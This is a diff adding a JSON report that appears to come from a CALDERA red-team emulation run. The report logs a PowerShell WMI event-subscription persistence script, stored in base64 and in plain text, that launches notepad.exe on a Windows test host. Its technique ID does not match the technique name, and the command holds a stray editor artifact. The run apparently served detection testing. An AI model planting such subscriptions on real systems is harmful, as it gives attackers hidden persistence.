@@ -1,0 +1,118 @@
+{
+    "adversary": {
+        "adversary_id": "6b5e74b0-65b2-4b32-9963-7ebb1d6fed4e",
+        "description": "Event",
+        "id": 17,
+        "name": "WMI",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
+                    "adversary_map_id": 138,
+                    "cleanup": "",
+                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
+                    "executor": "psh",
+                    "id": 187,
+                    "name": "WMI Event Subscription",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1078",
+                    "technique_name": "Windows Management Instrumentation Event Subscription",
+                    "test": "JEZpbHRlckFyZ3MgPSBAe25hbWU9J0F0b21pY1JlZFRlYW0tV01JUGVyc2lzdGVuY2UtRXhhbXBsZSc7CiAgICAgIEV2ZW50TmFtZVNwYWNlPSdyb290XENpbVYyJzsKICAgICAgUXVlcnlMYW5ndWFnZT0iV1FMIjsKICAgICAgUXVlcnk9IlNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1BlcmZGb3JtYXR0ZWREYXRhX1BlcmZPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjQwIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPCAzMjUifTsKJEZpbHRlcj1OZXctQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtQ2xhc3NOYW1lIF9fRXZlbnRGaWx0ZXIgLVByb3BlcnR5ICRGaWx0ZXJBcmdzOndxCgoKJENvbnN1bWVyQXJncyA9IEB7bmFtZT0nQXRvbWljUmVkVGVhbS1XTUlQZXJzaXN0ZW5jZS1FeGFtcGxlJzsKICAgICAgQ29tbWFuZExpbmVUZW1wbGF0ZT0iJCgkRW52OlN5c3RlbVJvb3QpXFN5c3RlbTMyXG5vdGVwYWQuZXhlIjt9CiRDb25zdW1lcj1OZXctQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtQ2xhc3NOYW1lIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtUHJvcGVydHkgJENvbnN1bWVyQXJncwoKJEZpbHRlclRvQ29uc3VtZXJBcmdzID0gQHsKRmlsdGVyID0gW1JlZl0gJEZpbHRlcjsKQ29uc3VtZXIgPSBbUmVmXSAkQ29uc3VtZXI7Cn0KJEZpbHRlclRvQ29uc3VtZXJCaW5kaW5nID0gTmV3LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdC9zdWJzY3JpcHRpb24gLUNsYXNzTmFtZSBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIC1Qcm9wZXJ0eSAkRmlsdGVyVG9Db25zdW1lckFyZ3M="
+                },
+                {
+                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
+                    "adversary_map_id": 138,
+                    "cleanup": "",
+                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
+                    "executor": "pwsh",
+                    "id": 188,
+                    "name": "WMI Event Subscription",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "execution",
+                    "technique_id": "T1078",
+                    "technique_name": "Windows Management Instrumentation Event Subscription",
+                    "test": "JEZpbHRlckFyZ3MgPSBAe25hbWU9J0F0b21pY1JlZFRlYW0tV01JUGVyc2lzdGVuY2UtRXhhbXBsZSc7CiAgICAgIEV2ZW50TmFtZVNwYWNlPSdyb290XENpbVYyJzsKICAgICAgUXVlcnlMYW5ndWFnZT0iV1FMIjsKICAgICAgUXVlcnk9IlNFTEVDVCAqIEZST00gX19JbnN0YW5jZU1vZGlmaWNhdGlvbkV2ZW50IFdJVEhJTiA2MCBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1BlcmZGb3JtYXR0ZWREYXRhX1BlcmZPU19TeXN0ZW0nIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPj0gMjQwIEFORCBUYXJnZXRJbnN0YW5jZS5TeXN0ZW1VcFRpbWUgPCAzMjUifTsKJEZpbHRlcj1OZXctQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtQ2xhc3NOYW1lIF9fRXZlbnRGaWx0ZXIgLVByb3BlcnR5ICRGaWx0ZXJBcmdzOndxCgoKJENvbnN1bWVyQXJncyA9IEB7bmFtZT0nQXRvbWljUmVkVGVhbS1XTUlQZXJzaXN0ZW5jZS1FeGFtcGxlJzsKICAgICAgQ29tbWFuZExpbmVUZW1wbGF0ZT0iJCgkRW52OlN5c3RlbVJvb3QpXFN5c3RlbTMyXG5vdGVwYWQuZXhlIjt9CiRDb25zdW1lcj1OZXctQ2ltSW5zdGFuY2UgLU5hbWVzcGFjZSByb290L3N1YnNjcmlwdGlvbiAtQ2xhc3NOYW1lIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtUHJvcGVydHkgJENvbnN1bWVyQXJncwoKJEZpbHRlclRvQ29uc3VtZXJBcmdzID0gQHsKRmlsdGVyID0gW1JlZl0gJEZpbHRlcjsKQ29uc3VtZXIgPSBbUmVmXSAkQ29uc3VtZXI7Cn0KJEZpbHRlclRvQ29uc3VtZXJCaW5kaW5nID0gTmV3LUNpbUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdC9zdWJzY3JpcHRpb24gLUNsYXNzTmFtZSBfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nIC1Qcm9wZXJ0eSAkRmlsdGVyVG9Db25zdW1lckFyZ3M="
+                }
+            ]
+        }
+    },
+    "facts": [],
+    "finish": "2019-10-29 15:55:16",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-29 15:55:16",
+            "last_trusted_seen": "2019-10-29 15:55:16",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 1540,
+            "platform": "windows",
+            "ppid": 3240,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "4/8",
+    "name": "wmi event",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": []
+        }
+    ],
+    "start": "2019-10-29 15:54:58",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "c1cd6388-3ced-48c7-a511-0434c6baT1084",
+                    "attack": {
+                        "tactic": "execution",
+                        "technique_id": "T1078",
+                        "technique_name": "Windows Management Instrumentation Event Subscription"
+                    },
+                    "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';      EventNameSpace='root\\CimV2';      QueryLanguage=\"WQL\";      Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs:wq$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';      CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs$FilterToConsumerArgs = @{Filter = [Ref] $Filter;Consumer = [Ref] $Consumer;}$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs",
+                    "delegated": "2019-10-29 15:55:15.946420",
+                    "description": "Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system",
+                    "executor": "psh",
+                    "name": "WMI Event Subscription",
+                    "platform": "windows",
+                    "run": "2019-10-29 15:55:16",
+                    "status": 1
+                }
+            ]
+        }
+    }
+}
